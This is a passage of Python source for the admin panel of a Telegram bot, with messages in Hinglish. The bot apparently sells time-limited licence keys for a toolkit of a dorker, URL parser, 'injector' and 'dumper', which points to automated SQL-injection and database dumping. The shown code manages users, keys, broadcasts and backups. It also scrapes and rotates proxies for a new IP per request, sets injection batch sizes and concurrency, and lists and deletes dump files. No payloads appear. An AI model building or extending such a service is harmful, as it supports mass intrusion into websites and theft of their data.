        [InlineKeyboardButton("📊 DASHBOARD", callback_data="a:dash"),
         InlineKeyboardButton("👥 USERS", callback_data="a:users")],
        [InlineKeyboardButton("🔑 KEYS", callback_data="a:keys"),
         InlineKeyboardButton("🧅 PROXY SCRAPE", callback_data="a:proxy")],
        [InlineKeyboardButton("⚙️ ENGINE", callback_data="a:eng"),
         InlineKeyboardButton("📦 DUMPS", callback_data="a:dumps")],
        [InlineKeyboardButton("🎨 THEME / FONT", callback_data="a:theme"),
         InlineKeyboardButton("🔑 API KEYS", callback_data="a:keys_api")],
        [InlineKeyboardButton("🪄 PREMIUM EMOJI (animated)", callback_data="a:emoji")],
        [InlineKeyboardButton("🚧 FEATURES ON/OFF", callback_data="a:features")],
        [InlineKeyboardButton("🎬 TUTORIAL VIDEO", callback_data="a:tutorial")],
        [InlineKeyboardButton("📣 BROADCAST", callback_data="a:bc"),
         InlineKeyboardButton("🚫 BANS", callback_data="a:bans")],
        [InlineKeyboardButton("💾 BACKUP", callback_data="a:backup"),
         InlineKeyboardButton("🖥 SYSTEM", callback_data="a:sys")],
        [InlineKeyboardButton("🧹 CLEAR DUMPS", callback_data="a:cleardumps"),
         InlineKeyboardButton("📜 LOGS", callback_data="a:logs")],
        [InlineKeyboardButton("🔄 RESTART BOT", callback_data="a:restart")],
        [InlineKeyboardButton("⬅️ MAIN MENU", callback_data="m:home")],
    ])


def admin_dash() -> str:
    total = len(USERS)
    active = sum(1 for u in USERS.values() if (u.get("expires") or "") > datetime.now().isoformat())
    banned = sum(1 for u in USERS.values() if u.get("banned"))
    pool = PROXIES or load_proxy_pool()
    c = db_counts()
    try:
        _srcfile = os.path.join(BASE_DIR, "bot.py")
        if not os.path.exists(_srcfile):
            _srcfile = os.path.join(BASE_DIR, "snake_core.py")
        up = int(time.time() - os.path.getmtime(_srcfile))
        upt = "%dh %dm" % (up // 3600, (up % 3600) // 60)
    except Exception:
        upt = "—"
    return (H("ADMIN DASHBOARD", "CORE %s" % VERSION) + "\n\n"
            "👥 Users    : <code>%s</code> (active <b>%d</b>, banned <b>%d</b>)\n"
            "🔑 Keys     : <code>%d</code> (unused <b>%d</b>)\n"
            "🧅 Proxies  : <code>%d</code> alive\n"
            "📦 Dumps    : <code>%d</code> files\n"
            "🗄 DB       : <code>%s</code> dorks • <code>%s</code> params\n"
            "⏱ Uptime   : <code>%s</code>"
            % (fmt(total), active, banned, len(KEYS),
               sum(1 for k in KEYS.values() if not k.get("used_by")),
               len(pool), len(dumps_list(999)), fmt(c["dorks"]), fmt(c["parameters"]), upt))


def theme_preview(keys) -> str:
    """Saare themes ka live preview."""
    lines = [H("THEME PICKER", "font + divider + icon"), ""]
    for k in keys:
        th = THEMES[k]
        mark = "✅ " if k == theme_name() else "▫️ "
        lines.append("%s<b>%s</b>" % (mark, F(th["label"], th["head"])))
        lines.append("   %s" % th["div"][:24])
        lines.append("   <code>%s</code>  •  %s"
                     % (F("Buttons", th["btn"]), F("subtitle text", th["sub"])))
        lines.append("")
    lines.append("👇 pick one — the whole bot switches to that look")
    return "\n".join(lines)


def kb_themes(cb_prefix: str = "th:set:") -> InlineKeyboardMarkup:
    keys = list(THEMES.keys())
    rows, row = [], []
    for k in keys:
        th = THEMES[k]
        row.append(InlineKeyboardButton(F(th["label"], th["btn"])[:60],
                                        callback_data=cb_prefix + k))
        if len(row) == 2:
            rows.append(row)
            row = []
    if row:
        rows.append(row)
    rows.append([InlineKeyboardButton(style("🔄 Reset (classic)", "btn"),
                                      callback_data=cb_prefix + DEFAULT_THEME)])
    return RK(rows)


SE_SLOTS = ["kw", "dork", "parse", "rev", "inj", "dump", "qa",
            "rand", "help", "home", "key", "admin", "proxy"]
SE_LABEL = {
    "kw": "HQ KEYWORDS", "dork": "DORKER", "parse": "PARSER", "rev": "URL REVERSE",
    "inj": "INJECTOR", "dump": "DUMPER", "qa": "QUALITY CHECK", "rand": "RANDOMIZER",
    "help": "HELP", "home": "HOME / START", "key": "KEYS", "admin": "ADMIN", "proxy": "PROXY",
}


def emoji_report() -> str:
    """Premium emoji list — kaun sa slot set hai."""
    got = premium_slots()
    lines = []
    for slot in SE_SLOTS:
        cid = got.get(slot, "")
        mark = "✅ <code>%s</code>" % cid if cid else "▫️ —"
        lines.append("◆ %s %s : %s" % (emo_btn(slot), style(SE_LABEL.get(slot, slot), "btn"), mark))
    state = "✅ ON" if EMOJI_OK[0] else "⚠️ OFF (Telegram ne reject kiya — normal emoji)"
    how = (
        "\n\n<b>ID kaise mile?</b>\n"
        "1️⃣ Jis message me animated emoji hai use <b>@JsonDumpBot</b> ko forward karo\n"
        "2️⃣ wahan <code>custom_emoji_id</code> ke saamne number copy karo\n"
        "3️⃣ yahan bhejo: <code>/se dork 5368324170671202286</code>\n\n"
        "<i>Note:</i> Telegram custom emoji sirf message text me allowed karta hai "
        "(button labels me nahi), aur bot owner ke paas <b>Telegram Premium</b> hona "
        "chahiye (Bot API 9.4+). Nahi hai to bot khud normal emoji pe switch ho jata hai."
    )
    return (H("PREMIUM EMOJI", "%d/%d set · %s" % (len(got), len(SE_SLOTS), state), slot="admin")
            + "\n\n" + "\n".join(lines) + how)


async def cmd_se(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ /se — premium animated emoji ids (admin)

    /se                      → list
    /se dork 5368...         → set
    /se dork off             → remove
    /se test                 → test message
    """
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.effective_message.reply_text("🚫 Admin only.")
        return
    args = list(context.args or [])
    kb = RK([[InlineKeyboardButton("🏠 MENU", callback_data="m:home")]])

    if not args or args[0].lower() in ("list", "show", "help"):
        await update.effective_message.reply_text(emoji_report(), parse_mode=ParseMode.HTML,
                                                 reply_markup=kb, disable_web_page_preview=True)
        return

    if args[0].lower() == "test":
        got = premium_slots()
        if not got:
            await update.effective_message.reply_text(
                "🎨 Koi premium emoji set nahi hai.\n\n" + emoji_report(),
                parse_mode=ParseMode.HTML, reply_markup=kb, disable_web_page_preview=True)
            return
        body = "\n".join("◆ %s %s" % (emo(sl), style(SE_LABEL.get(sl, sl), "btn"))
                         for sl in SE_SLOTS if sl in got)
        txt = (H("EMOJI TEST", "animated dikhna chahiye", slot="admin") + "\n\n" + body +
               "\n\n<i>Agar animation nahi dikh rahi:</i> bot owner ka Telegram Premium "
               "check karo, phir <code>/se</code>. Bot khud bhi detect karta hai — reject "
               "hote hi normal emoji pe chala jata hai.")
        await update.effective_message.reply_text(txt, parse_mode=ParseMode.HTML,
                                                 reply_markup=kb, disable_web_page_preview=True)
        return

    slot = args[0].lower()
    val = args[1] if len(args) > 1 else ""
    if slot not in SE_SLOTS:
        await update.effective_message.reply_text(
            "❌ Unknown slot: <code>%s</code>\n\nValid: <code>%s</code>"
            % (esc(slot), ", ".join(SE_SLOTS)), parse_mode=ParseMode.HTML, reply_markup=kb)
        return
    if not val:
        await update.effective_message.reply_text(
            "Usage: <code>/se %s 5368324170671202286</code>\n"
            "Hatane ke liye: <code>/se %s off</code>" % (slot, slot),
            parse_mode=ParseMode.HTML, reply_markup=kb)
        return

    good, err = set_premium(slot, val)
    if not good:
        await update.effective_message.reply_text("❌ " + err, parse_mode=ParseMode.HTML,
                                                 reply_markup=kb)
        return
    cid = premium_slots().get(slot, "")
    if cid:
        msg = ("✅ <b>%s</b> → animated emoji set\n\n◆ %s\n<code>%s</code>\n\n"
               "Dekhne ke liye: <code>/se test</code>" % (esc(SE_LABEL.get(slot, slot)),
                                                           emo(slot), cid))
    else:
        msg = "🗑 <b>%s</b> → premium emoji hata diya (normal wala chalega)" %               esc(SE_LABEL.get(slot, slot))
    await update.effective_message.reply_text(msg, parse_mode=ParseMode.HTML,
                                             reply_markup=kb, disable_web_page_preview=True)


async def cmd_theme(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.effective_message.reply_text(
            "%s\n\nOnly an admin can change the theme.\nActive now: <b>%s</b>"
            % (H("THEME"), F(THEMES[theme_name()]["label"], T()["head"])),
            parse_mode=ParseMode.HTML)
        return
    await update.effective_message.reply_text(
        theme_preview(list(THEMES.keys())), parse_mode=ParseMode.HTML,
        reply_markup=kb_themes())


async def cb_theme_set(update, context, name: str):
    q = update.callback_query
    if not is_admin(update.effective_user.id):
        try:
            await q.answer("Admin only", show_alert=True)
        except Exception:
            pass
        return
    if name not in THEMES:
        name = DEFAULT_THEME
    sset("theme", name)
    try:
        await q.edit_message_text(
            (H("THEME SET", THEMES[name]["label"]) + "\n\n"
             "✅ Poora bot ab <b>%s</b> look me hai.\n\n"
             "%s\n"
             "⏱ Restart ki zaroorat nahi — turant apply.\n\n"
             "<i>Badalna hai? /theme dobara bhejo.</i>"
             % (F(THEMES[name]["label"], THEMES[name]["head"]), THEMES[name]["div"])),
            parse_mode=ParseMode.HTML, reply_markup=kb_themes())
    except Exception:
        pass


async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.effective_message.reply_text("🚫 Access denied.")
        return
    await update.effective_message.reply_text(admin_dash(), reply_markup=kb_admin(),
                                              parse_mode=ParseMode.HTML)


async def cb_premium_pick(update, context, slot: str):
    """Emoji forward ke baad slot button — premium id set karo."""
    q = update.callback_query
    cid = str(context.user_data.get("se_id") or "")
    if slot == "off":
        for sl in SE_SLOTS:
            if sl in PREMIUM_EMOJI:
                set_premium(sl, "off")
        try:
            await q.edit_message_text(
                H("PREMIUM EMOJI", "saaf", slot="admin") + "\n\n" +
                P("Saare premium emoji hata diye — normal wale chalenge."),
                parse_mode=ParseMode.HTML,
                reply_markup=RK([[InlineKeyboardButton("⬅️ BACK", callback_data="a:emoji")]]))
        except Exception:
            pass
        return
    if not cid.isdigit():
        try:
            await q.answer("Pehle emoji wala message forward karo", show_alert=True)
        except Exception:
            pass
        return
    good, err = set_premium(slot, cid)
    try:
        if good:
            await q.edit_message_text(
                (H("PREMIUM EMOJI", "set", slot="admin") + "\n\n"
                 + "◆ %s <b>%s</b>\n<code>%s</code>\n\n" % (
                     emo(slot), esc(SE_LABEL.get(slot, slot)), cid)
                 + P("Dekhne ke liye <b>TEST</b> dabao.")),
                parse_mode=ParseMode.HTML,
                reply_markup=RK([
                    [InlineKeyboardButton("🧪 TEST", callback_data="a:emojitest")],
                    [InlineKeyboardButton("🪄 AUR EMOJI", callback_data="a:emoji")],
                    [InlineKeyboardButton("🏠 MENU", callback_data="m:home")]]))
        else:
            await q.edit_message_text("❌ " + err, parse_mode=ParseMode.HTML,
                                      reply_markup=kb_back("a:emoji"))
    except Exception:
        pass
    return


async def admin_callback(update, context, action: str):
    q = update.callback_query
    uid = update.effective_user.id
    if not is_admin(uid):
        try:
            await q.answer("Admin only", show_alert=True)
        except Exception:
            pass
        return

    async def ed(txt, kb=None):
        try:
            await q.edit_message_text(txt, reply_markup=kb or kb_back("a:home"),
                                      parse_mode=ParseMode.HTML)
        except Exception:
            pass

    if action == "home":
        return await ed(admin_dash(), kb_admin())
    if action == "dash":
        return await ed(admin_dash(), kb_admin())

    if action == "users":
        rows = [[InlineKeyboardButton("⬇️ CSV EXPORT", callback_data="a:userscsv")]]
        rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="a:home")])
        lst = sorted(USERS.items(), key=lambda z: z[1].get("last") or "", reverse=True)[:20]
        body = "\n".join("• <code>%s</code> %s %s" % (
            u, esc((r.get("name") or "?")[:18]),
            "🚫" if r.get("banned") else ("✅" if (r.get("expires") or "") > datetime.now().isoformat() else "⚪"))
            for u, r in lst) or "—"
        return await ed(H("ADMIN — USERS", "%d total" % len(USERS)) + "\n\n" + body,
                       RK(rows))

    if action == "userscsv":
        path = dump_json(USERS, "users")
        await send_file(update, path, "👥 users.json")
        return

    if action == "keys":
        unused = sum(1 for k in KEYS.values() if not k.get("used_by"))
        kb = RK([
            [InlineKeyboardButton("➕ 7 DIN", callback_data="a:genkey:7"),
             InlineKeyboardButton("➕ 30 DIN", callback_data="a:genkey:30")],
            [InlineKeyboardButton("➕ 90 DIN", callback_data="a:genkey:90"),
             InlineKeyboardButton("♾ 365 DIN", callback_data="a:genkey:365")],
            [InlineKeyboardButton("📋 LIST", callback_data="a:keylist")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="a:home")],
        ])
        return await ed(H("ADMIN — KEYS", "%d total • %d unused" % (len(KEYS), unused)) +
                        "\n\nNaya key kis duration ka?", kb)

    if action.startswith("genkey:"):
        days = int(action.split(":")[1])
        key = "SNK-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=4)) + "-" + \
              "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
        KEYS[key] = {"days": days, "created": datetime.now().isoformat(timespec="seconds")}
        save_all()
        kb = RK([
            [InlineKeyboardButton("➕ AUR 7D", callback_data="a:genkey:7")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="a:keys")],
        ])
        return await ed(H("KEY BAN GAYI") + "\n\n<code>%s</code>\n\n📅 %d din\n\n"
                        "<i>Copy karke user ko bhejo.</i>" % (key, days), kb)

    if action == "keylist":
        items = list(KEYS.items())[-25:]
        body = "\n".join("• <code>%s</code> %dd %s" % (k, v.get("days", 0),
                                                       ("✅ " + str(v.get("used_by"))) if v.get("used_by") else "⚪ unused")
                         for k, v in items) or "—"
        return await ed(H("KEYS", "%d total" % len(KEYS)) + "\n\n" + body)

    if action == "proxy":
        pool = PROXIES or load_proxy_pool()
        kb = RK([
            [InlineKeyboardButton("🚀 SCAN NOW", callback_data="a:pxscan")],
            [InlineKeyboardButton("➕ ADD PROXIES (paste / file)",
                                  callback_data="a:pxadd")],
            [InlineKeyboardButton("🔁 ROTATING PROXY (webshare / any)",
                                  callback_data="a:rotadd")],
            [InlineKeyboardButton("🧪 TEST ROTATION (%d)" % len(rot_proxies()),
                                  callback_data="a:rottest"),
             InlineKeyboardButton("🗑 ROT", callback_data="a:rotclear")],
            [InlineKeyboardButton("🔄 ROTATION: %s"
                                  % ("ON" if sget("proxy_rotate", 1) else "OFF"),
                                  callback_data="a:pxrot")],
            [InlineKeyboardButton("📦 CHECK BATCH: %s" % fmt(proxy_batch_size()),
                                  callback_data="a:pzbatch")],
            [InlineKeyboardButton("🎯 TARGET ALIVE: %s"
                                  % ("ALL" if not want_alive_n() else fmt(want_alive_n())),
                                  callback_data="a:pzwant")],
            [InlineKeyboardButton("🗑 CLEAR", callback_data="a:pxclear")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="a:home")],
        ])
        return await ed(H("ADMIN — PROXY") + "\n\n✅ Alive: <code>%d</code>\n📄 Manual: <code>%d</code>\n"
                        "🌐 Sources: <code>%d</code>\n📦 Batch: <code>%s</code> • 🎯 Target: <code>%s</code>\n"
                        "🔁 Rotating endpoint: <code>%s</code> • pool rotation: <code>%s</code>\n"
                        "14+ formats\n\n%s"
                        "\n\n<i>Batch = how many are checked at once. With 60k found, 15 batches cover all.</i>"
                        % (len(pool), len(manual_proxies()), len(PROXY_SOURCES),
                           fmt(proxy_batch_size()),
                           ("all" if not want_alive_n() else fmt(want_alive_n())),
                           ("✅ %d set" % len(rot_proxies())) if rot_proxies() else "⚪ none",
                           ("ON" if sget("proxy_rotate", 1) else "OFF"),
                           short_list([p["url"].replace("http://", "") for p in pool[:12]], 12)), kb)

    if action == "pxscan":
        await ed("⏳ Admin scan running… (scrape → batch check)")
        px = _uniq(await scrape_proxies(force=True) + manual_proxies())

        async def _aprog(st):
            await ed("🔍 <b>%s</b>\n%s\n\n📥 Total : <code>%s</code>\n"
                     "📦 Batch : <code>%d/%d</code> • %s\n"
                     "🔍 Checked: <code>%s/%s</code> %s\n✅ Alive : <code>%d</code>"
                     % (F("ADMIN CHECK", T()["head"]), T()["div"], fmt(st["total"]),
                        st.get("batch", 1), st.get("batches", 1),
                        fmt(st.get("batch_size", proxy_batch_size())),
                        fmt(st["done"]), fmt(st["total"]),
                        bar(st["done"] / max(1, st["total"]) * 100), st["alive"]))

        good = await check_proxies_batched(px, progress=_aprog)
        save_proxy_pool(good)
        return await ed(H("ADMIN — PROXY") + "\n\nScraped: <code>%s</code>\n"
                        "Checked: <code>%s</code> (batch %s)\nAlive: <code>%d</code>\n"
                        "Sources: <code>%d/%d</code>"
                        % (fmt(len(px)), fmt(len(px)), fmt(proxy_batch_size()),
                           len(good), PSTATS.get("sources_ok", 0), len(PROXY_SOURCES)),
                        RK([[InlineKeyboardButton("⬅️ BACK", callback_data="a:proxy")]]))

    if action == "pxrot":
        sset("proxy_rotate", 0 if sget("proxy_rotate", 1) else 1)
        return await admin_callback(update, context, "proxy")

    if action == "rotadd":
        await ed(H("ROTATING PROXY", "one endpoint • new IP every request") + "\n\n"
                 "Send the rotating endpoint in <b>any</b> of these formats:\n"
                 "<code>host:port:user:pass</code>\n"
                 "<code>user:pass@host:port</code>\n"
                 "<code>http://user:pass@host:port</code>\n"
                 "<code>socks5h://user:pass@host:port</code>\n\n"
                 "Webshare example:\n"
                 "<code>p.webshare.io:80:USER-rotate:PASS</code>\n\n"
                 "<i>One endpoint gives a new IP on every request — it is kept separately, "
                 "never marked dead for long (only a 10s rest).</i>",
                 RK([[InlineKeyboardButton("⬅️ BACK", callback_data="a:proxy")]]))
        await_set(context, "rot_paste")
        context.user_data["await_admin"] = True
        return

    if action == "rottest":
        urls = rot_proxies()
        if not urls:
            return await admin_callback(update, context, "rotadd")
        await ed("🧪 <b>TESTING ROTATION</b>\n\n"
                 "3 requests → IP dekhte hain, phir ek engine se dork test…",
                 RK([[InlineKeyboardButton("⬅️ BACK", callback_data="a:proxy")]]))
        res = await rot_live_test(urls, tries=3)
        return await ed(rot_test_card(res),
                        RK([[InlineKeyboardButton("🔁 TEST AGAIN", callback_data="a:rottest")],
                            [InlineKeyboardButton("⬅️ BACK", callback_data="a:proxy")]]))

    if action == "rotclear":
        rot_save([])
        return await ed(H("ROTATING PROXY", "removed") + "\n\n"
                        "Rotating endpoint removed. Pool proxies are unchanged.",
                        RK([[InlineKeyboardButton("⬅️ BACK", callback_data="a:proxy")]]))

    if action == "pxadd":
        await ed(H("ADD PROXIES", "14+ formats") + "\n\n"
                 "Paste proxies (or send a .txt file). Supported:\n"
                 "<code>1.2.3.4:8080</code>\n"
                 "<code>http://1.2.3.4:8080</code>\n"
                 "<code>socks5://1.2.3.4:1080</code>\n"
                 "<code>socks5h://user:pass@1.2.3.4:1080</code>\n"
                 "<code>socks4a://1.2.3.4:1080</code>\n"
                 "<code>1.2.3.4 8080</code> · <code>1.2.3.4,8080</code>\n"
                 "<code>[2001:db8::1]:8080</code> (IPv6)\n"
                 "JSON (<code>data/proxies/results</code>) also works\n\n"
                 "<i>All of them are checked (multi-endpoint) → saved to the pool.</i>",
                 RK([[InlineKeyboardButton("⬅️ BACK", callback_data="a:proxy")]]))
        await_set(context, "px_paste")
        context.user_data["await_admin"] = True
        return

    if action == "pzbatch":
        v = proxy_batch_size()
        nxt = {200: 1000, 1000: 2000, 2000: 4000, 4000: 8000,
               8000: 10000, 10000: 200}.get(v, 4000)
        sset("proxy_batch", nxt)
        return await admin_callback(update, context, "proxy")

    if action == "pzwant":
        v = want_alive_n()
        nxt = {0: 200, 200: 500, 500: 1000, 1000: 2000, 2000: 0}.get(v, 200)
        sset("want_alive", nxt)
        return await admin_callback(update, context, "proxy")

    if action == "injbatch":
        v = inj_batch_size()
        nxt = {20: 100, 100: 200, 200: 500, 500: 1000, 1000: 20}.get(v, 200)
        sset("inj_batch", nxt)
        return await admin_callback(update, context, "eng")

    if action == "pxclear":
        save_proxy_pool([])
        return await ed("🗑 Pool clear.", RK([[InlineKeyboardButton("⬅️ BACK", callback_data="a:proxy")]]))

    if action == "eng":
        kb = RK([
            [InlineKeyboardButton("Pages: %s" % sget("parse_pages", 1), callback_data="a:setpages")],
            [InlineKeyboardButton("Check timeout: %ss" % sget("check_timeout", 6), callback_data="a:setto")],
            [InlineKeyboardButton("Concurrency: %s" % sget("concurrency", 400), callback_data="a:setconc")],
            [InlineKeyboardButton("💉 INJECT BATCH: %s" % fmt(inj_batch_size()),
                                  callback_data="a:injbatch")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="a:home")],
        ])
        return await ed(H("ADMIN — ENGINE") + "\n\nTap a button to change a setting "
                        "(the value cycles).\n\n"
                        "📦 Proxy batch / 🎯 target → on the <b>PROXY</b> screen.\n"
                        "💉 Inject batch = how many URLs the injector processes at once.\n"
                        "Exact value: <code>/batch proxy 4000</code>", kb)

    if action == "setpages":
        v = int(sget("parse_pages", 1))
        v = 1 if v >= 5 else v + 1
        sset("parse_pages", v)
        return await admin_callback(update, context, "eng")
    if action == "setto":
        v = int(sget("check_timeout", 6))
        v = 4 if v >= 12 else v + 2
        sset("check_timeout", v)
        return await admin_callback(update, context, "eng")
    if action == "setconc":
        v = int(sget("concurrency", 400))
        v = 100 if v >= 800 else v + 100
        sset("concurrency", v)
        return await admin_callback(update, context, "eng")

    if action == "dumps":
        files = dumps_list(10)
        body = "\n".join("• <code>%s</code> %.0f KB" % (os.path.basename(f)[:40],
                                                        os.path.getsize(f) / 1024) for f in files) or "—"
        return await ed(H("ADMIN — DUMPS", "%d files" % len(files)) + "\n\n" + body)

    if action == "cleardumps":
        n = 0
        for f in dumps_list(9999):
            try:
                os.remove(f)
                n += 1
            except Exception:
                pass
        return await ed("🧹 %d files delete." % n, RK([[InlineKeyboardButton("⬅️ BACK", callback_data="a:home")]]))

    if action == "bc":
        await_set(context, "bc_text")
        context.user_data["await_admin"] = True
        return await ed(H("ADMIN — BROADCAST") + "\n\nAb message bhejo — sab users ko jayega.\n"
                        "<i>Cancel: /admin</i>",
                        RK([[InlineKeyboardButton("⬅️ BACK", callback_data="a:home")]]))
    if action == "bans":
        lst = [(u, r) for u, r in USERS.items() if r.get("banned")]
        body = "\n".join("• <code>%s</code> %s" % (u, esc((r.get("name") or "?")[:18])) for u, r in lst) or "—"
        return await ed(H("ADMIN — BANS", "%d banned" % len(lst)) + "\n\n" + body +
                        "\n\n<i>Ban/unban: /ban &lt;id&gt; , /unban &lt;id&gt;</i>")
    if action == "backup":
        name = os.path.join(DUMP_DIR, "backup_%s.zip" % stamp())
        with zipfile.ZipFile(name, "w", zipfile.ZIP_DEFLATED) as zf:
            for f in ("users.json", "keys.json", "settings.json", "proxies.json"):
                p = _path(f)
                if os.path.exists(p):
                    zf.write(p, arcname=f)
        await send_file(update, name, "💾 backup")
        return
    if action == "keys_api":
        k = api_keys()
        await ed(H("API KEYS", "all optional") + "\n\n"
                 + "\n".join([
                     KV("Serper", ("✅ set" if k["serper"] else
                                   "⚪ not set — <code>/setkey serper KEY</code>"), "🔵"),
                     KV("SerpApi", ("✅ set" if k["serpapi"] else
                                    "⚪ not set — <code>/setkey serpapi KEY</code>"), "🟢"),
                     KV("Brave", ("✅ set" if k["brave"] else
                                  "⚪ not set — <code>/setkey brave KEY</code>"), "🦁"),
                     KV("CSE", ("✅ set" if (k["cse_key"] and k["cse_cx"]) else
                                "⚪ not set — <code>/setkey cse KEY CX</code>"), "🔴"),
                     KV("Free Google", ("⚪ OFF" if not gj_enabled() else
                                        "✅ ON • %d endpoints" % len(gj_pool())), "🐦"),
                     KV("Common Crawl", "✅ always on (free)", "🌐"),
                 ])
                 + "\n\n<i>Even with no keys, all 9 engines + Common Crawl keep working.</i>\n\n"
                 "📋 Free + paid list: <code>/apis</code>",
                 RK([
                     [InlineKeyboardButton("📋 API LIST (/apis)", callback_data="a:apis")],
                     [InlineKeyboardButton("⬅️ BACK", callback_data="a:keys_api")],
                 ]))
        return

    if action == "apis":
        await ed(APIS_TEXT, RK([
            [InlineKeyboardButton("⬅️ API KEYS", callback_data="a:keys_api")],
            [InlineKeyboardButton("🏠 MAIN MENU", callback_data="m:home")],
        ]))
        return

    if action == "emoji":
        try:
            await q.edit_message_text(
                emoji_report(), parse_mode=ParseMode.HTML,
                reply_markup=RK([
                    [InlineKeyboardButton("🧪 TEST ANIMATION", callback_data="a:emojitest")],
                    [InlineKeyboardButton("⬅️ ADMIN", callback_data="a:home")],
                ]), disable_web_page_preview=True)
        except Exception:
            pass
        return

    if action == "emojitest":
        got = premium_slots()
        body = ("\n".join("◆ %s %s" % (emo(sl), style(SE_LABEL.get(sl, sl), "btn"))
                          for sl in SE_SLOTS if sl in got) if got else
                "<i>Koi premium id set nahi hai.</i> Neeche se slot + id bhejo:\n"
                "<code>/se dork 5368324170671202286</code>")
        try:
            await q.edit_message_text(
                H("EMOJI TEST", "animated dikhna chahiye", slot="admin") + "\n\n" + body,
                parse_mode=ParseMode.HTML,
                reply_markup=RK([[InlineKeyboardButton("⬅️ BACK", callback_data="a:emoji")]]),
                disable_web_page_preview=True)
        except Exception:
            pass
        return

    if action == "theme":
        try:
            await q.edit_message_text(theme_preview(list(THEMES.keys())),
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=kb_themes("a:themeset:"))
        except Exception:
            pass
        return

    if action.startswith("themeset:"):
        name = action.split(":", 1)[1]
        if name not in THEMES:
            name = DEFAULT_THEME
        sset("theme", name)
        try:
            await q.edit_message_text(
                (H("THEME SET", THEMES[name]["label"]) + "\n\n"
                 "✅ Poora bot ab <b>%s</b> look me hai.\n\n%s"
                 % (F(THEMES[name]["label"], THEMES[name]["head"]), THEMES[name]["div"])),
                parse_mode=ParseMode.HTML, reply_markup=kb_themes("a:themeset:"))
        except Exception:
            pass
        return

    if action.startswith("features") or action.startswith("feat"):
        arg = action.split(":", 1)[1] if ":" in action else ""
        if action.startswith("featall:"):
            if action.endswith("1"):
                SETTINGS["feat_off"] = {}
                jsave("settings", SETTINGS)
            arg = ""
        elif action.startswith("feat:") and arg:
            if arg in FEATURES:
                feat_set(arg, not feat_is_off(arg))
            off_now = ", ".join(feat_off().keys()) or "koi nahi"
            return await ed(
                (H("FEATURES", "ON / OFF") + "\n\n"
                 "%s\n%s\n\n%s\n\n%s"
                 % (KV("Band", "🚫 = the user sees the message"),
                    KV("Chalu", "✅ = works normally"),
                    P("✏️ MSG — write a custom message (e.g. this feature is under maintenance)"),
                    KV("Abhi band", "<code>%s</code>" % off_now, "📌"))),
                feat_kb())
        elif action.startswith("featmsg:") and arg:
            await_set(context, "feat_msg")
            context.user_data["await_admin"] = True
            context.user_data["feat_key"] = arg
            return await ed(
                (H("CUSTOM MESSAGE", FEATURES.get(arg, ("?",))[0]) + "\n\n"
                 "%s\n%s\n\n%s"
                 % (P("Send the message you want the user to see"),
                    P("e.g. this feature is under maintenance"),
                    KV("Remove", "send an empty <code>-</code> = default message"))),
                kb_back("a:features"))
        off_now = ", ".join(feat_off().keys()) or "koi nahi"
        return await ed(
            (H("FEATURES", "ON / OFF") + "\n\n"
             "%s\n%s\n\n%s"
             % (KV("Band", "🚫 = the user sees the message"),
                KV("Chalu", "✅ = works normally"),
                KV("Abhi band", "<code>%s</code>" % off_now, "📌"))),
            feat_kb())

    if action == "tutorial":
        cur = str(SETTINGS.get("tutorial") or "").strip() or "—"
        await_set(context, "a_tut")
        context.user_data["await_admin"] = True
        return await ed(
            (H("TUTORIAL VIDEO", "how to use") + "\n\n"
             "📺 Abhi: <code>%s</code>\n\n"
             "YouTube video ka link bhejo —\n"
             "user HELP me <b>🎬 HOW TO USE</b> button pe click karega.\n\n"
             "Hatane ke liye <code>-</code> bhejo."
             % esc(cur)),
            kb_back("a:home"))

    if action == "logs":
        p = os.path.join(BASE_DIR, "bot.log")
        tail = "—"
        if os.path.exists(p):
            try:
                with open(p, encoding="utf-8", errors="ignore") as f:
                    tail = "".join(f.readlines()[-25:])
            except Exception:
                tail = "—"
        for ch in chunk_lines(H("ADMIN — LOGS") + "\n\n<pre>%s</pre>" % esc(tail[-3500:]))[:2]:
            try:
                await q.message.reply_text(ch, parse_mode=ParseMode.HTML)
            except Exception:
                pass
        return

    if action == "restart":
        try:
            await q.edit_message_text("🔄 Restarting…", parse_mode=ParseMode.HTML)
        except Exception:
            pass
        await asyncio.sleep(0.5)
        os.execv(sys.executable, [sys.executable, os.path.abspath(__file__)] + sys.argv[1:])
        return

    if action == "sys":
        try:
            import platform
            txt = (H("ADMIN — SYSTEM") + "\n\n"
                   "🐍 %s %s\n🖥 %s\n🐍 Python %s\n"
                   "📁 %s\n🧵 PID %d\n📊 Lines %d"
                   % (BRAND, VERSION, esc(platform.platform()[:48]),
                      esc(platform.python_version()), esc(BASE_DIR), os.getpid(),
                      len(open(os.path.abspath(__file__), encoding="utf-8").readlines())))
        except Exception as exc:
            txt = "❌ %s" % exc
        return await ed(txt)

    await ed("❓ Unknown action", kb_admin())


# ── admin text commands ──────────────────────────────────────────────────────
async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.effective_message.reply_text("Usage: /ban <user_id>")
        return
    t = context.args[0]
    USERS.setdefault(t, {})["banned"] = True
    save_all()
    await update.effective_message.reply_text("🚫 Banned <code>%s</code>" % t, parse_mode=ParseMode.HTML)


async def cmd_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.effective_message.reply_text("Usage: /unban <user_id>")
        return
    t = context.args[0]
    if t in USERS:
        USERS[t].pop("banned", None)
        save_all()
    await update.effective_message.reply_text("✅ Unbanned <code>%s</code>" % t, parse_mode=ParseMode.HTML)


async def cmd_addkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    days = 30
    if context.args:
        try:
            days = int(context.args[0])
        except Exception:
            pass
    key = "SNK-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=4)) + "-" + \
          "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
